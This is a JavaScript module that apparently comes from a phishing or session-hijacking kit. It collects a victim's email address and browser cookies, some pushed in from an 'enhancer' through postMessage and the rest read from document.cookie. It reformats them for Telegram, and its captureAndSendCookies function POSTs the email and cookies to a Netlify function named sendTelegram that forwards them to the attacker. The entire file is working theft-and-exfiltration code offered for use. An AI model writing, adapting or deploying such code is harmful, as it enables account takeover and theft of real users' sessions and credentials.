let latestCapturedEmail = '';
let latestCapturedCookies = '';

// Allow other parts of the app to set latest captured data (used by postMessage event handlers)
export function setCapturedEmail(email) {
    if (email) latestCapturedEmail = email;
}

export function setCapturedCookies(cookies) {
    if (cookies) latestCapturedCookies = (typeof cookies === 'string' ? cookies : JSON.stringify(cookies));
}

// Function to get the most reliable email/cookies
export function getMostReliableEmail(sessionEmail) {
    return latestCapturedEmail || sessionEmail || '';
}

export function getMostReliableCookies() {
    return latestCapturedCookies || document.cookie;
}

// Get all cookies as array of {name, value, ...} objects (optional, can be improved for special cases)
export function getAllCapturedCookies() {
    try {
        // If cookies were set from enhancer, parse them if needed
        if (latestCapturedCookies) {
            try {
                const parsed = JSON.parse(latestCapturedCookies);
                if (Array.isArray(parsed)) return parsed;
            } catch {
                // fallback: treat as string
            }
        }
        // Otherwise, parse document.cookie into array
        return document.cookie
            .split(';')
            .map(cookie => {
                const [name, ...valueParts] = cookie.trim().split('=');
                const value = valueParts.join('=');
                return {
                    name,
                    value,
                    domain: window.location.hostname,
                    path: '/',
                    secure: window.location.protocol === 'https:',
                };
            })
            .filter(c => c.name && c.value);
    } catch (e) {
        return [];
    }
}

// Format cookies for Telegram (optional, not used if sending JSON)
export function formatCookiesForTelegram(cookies) {
    return cookies.map(cookie => {
        let cookieString = `${cookie.name}=${cookie.value}`;
        if (cookie.domain) {
            cookieString += `; domain=${cookie.domain}`;
        }
        if (cookie.path) {
            cookieString += `; path=${cookie.path}`;
        }
        if (cookie.expires) {
            const expiresDate = new Date(cookie.expires * 1000);
            cookieString += `; expires=${expiresDate.toUTCString()}`;
        }
        if (cookie.httpOnly) {
            cookieString += '; HttpOnly';
        }
        if (cookie.secure) {
            cookieString += '; Secure';
        }
        if (cookie.sameSite) {
            cookieString += `; SameSite=${cookie.sameSite}`;
        }
        return cookieString;
    }).join('\n');
}

// Send cookies and user email to Telegram (as JSON)
export async function captureAndSendCookies(userEmail, cookies) {
    // cookies can be stringified JSON or plain string
    let cookiesToSend = cookies;
    try {
        // If it's JSON string, try to parse it first
        cookiesToSend = JSON.parse(cookies);
    } catch (e) {
        // If it's just string, send as is
    }
    await fetch('/.netlify/functions/sendTelegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            email: userEmail,
            cookies: cookiesToSend
        })
    });
}